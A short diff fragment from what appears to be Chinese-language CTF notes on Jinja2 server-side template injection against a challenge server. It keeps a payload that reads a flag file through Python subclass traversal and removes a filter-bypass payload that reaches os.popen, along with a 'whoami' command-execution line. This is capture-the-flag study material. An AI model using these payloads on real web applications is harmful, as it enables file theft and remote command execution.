@@ -308,11 +308,5 @@ http://111.200.241.244:62326/{{''[request.args.a]}}?a=__class__
 类似
 {{''.__class__.__mro__[2].__subclasses__()[40].('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').read()}}
 
-
-
-/{{[request.args.a][request.args.b][request.args.c][request.args.e]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=lipsum&b=__globals__&c=os&e=popen&d=read
-
-lipsum.__globals__.os.popen('whoami').read()
-
 ```
 
